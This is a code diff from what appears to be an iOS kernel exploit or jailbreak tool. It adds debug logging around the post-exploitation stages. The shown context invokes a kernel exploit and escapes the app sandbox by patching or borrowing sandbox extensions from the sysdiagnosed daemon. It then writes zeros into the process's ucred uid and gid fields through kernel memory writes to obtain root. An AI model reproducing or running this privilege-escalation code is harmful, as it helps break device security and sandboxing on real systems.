@@ -76,6 +76,8 @@ static void sword_log_bridge(const char *line, void *context) {
         @autoreleasepool {
             // Blocks until kernel read/write is stable.
             int result = kexploit_opa334();
+            printf("[i] bridge: kexploit_opa334 returned %d\n", result);
+            fflush(stdout);
 
             if (result != 0) {
                 dispatch_async(dispatch_get_main_queue(), ^{
@@ -86,6 +88,7 @@ static void sword_log_bridge(const char *line, void *context) {
             }
 
             [self applyRootAndSandbox];
+            fflush(stdout);
 
             // applyRootAndSandbox refuses to run in SwordExploitStateRunning,
             // so force the state machine forward before calling it.
@@ -108,7 +111,10 @@ static void sword_log_bridge(const char *line, void *context) {
     // 1. Sandbox: rewrite our own container extension into a scoped read/write
     //    extension rooted at "/". Falls back to borrowing an extension set from
     //    a privileged daemon if the in-place patch does not verify.
+    printf("[i] stage 1: sandbox patch\n");
+    fflush(stdout);
     BOOL sandboxOK = (patch_sandbox_ext() == 0);
+    printf("[i] stage 1: patch_sandbox_ext -> %d\n", sandboxOK);
     if (!sandboxOK || check_sandbox_var_rw() != 0) {
         borrow_sandbox_ext("sysdiagnosed");
         sandboxOK = (check_sandbox_var_rw() == 0);
@@ -118,13 +124,20 @@ static void sword_log_bridge(const char *line, void *context) {
         sandboxOK = (check_sandbox_var_rw() == 0);
     }
     self.sandboxEscaped = sandboxOK;
+    printf("[i] stage 1: sandbox escaped=%d\n", sandboxOK);
+    fflush(stdout);
 
     // 2. Credentials: patch our own ucred to uid/gid 0.
+    printf("[i] stage 2: patching ucred\n");
+    fflush(stdout);
     uint64_t proc = proc_self();
+    printf("[i] ucred: self proc=0x%llx\n", proc);
     if (proc) {
         uint64_t proc_ro = kread64(proc + off_proc_p_proc_ro);
+        printf("[i] ucred: proc_ro=0x%llx\n", proc_ro);
         if (is_kaddr_valid(proc_ro)) {
             uint64_t ucred = kread64(proc_ro + off_proc_ro_p_ucred);
+            printf("[i] ucred: ucred=0x%llx\n", ucred);
             if (is_kaddr_valid(ucred)) {
                 kwrite32(ucred + UCRED_CR_UID, 0);
                 kwrite32(ucred + UCRED_CR_RUID, 0);
@@ -133,7 +146,10 @@ static void sword_log_bridge(const char *line, void *context) {
                 kwrite32(ucred + UCRED_CR_GROUPS, 0);
                 kwrite32(ucred + UCRED_CR_RGID, 0);
                 kwrite32(ucred + UCRED_CR_SVGID, 0);
+                printf("[i] ucred: patched, uid now %u\n", getuid());
             }
+        } else {
+            printf("[-] ucred: proc_ro invalid\n");
         }
     }
     self.rootAchieved = (getuid() == 0);
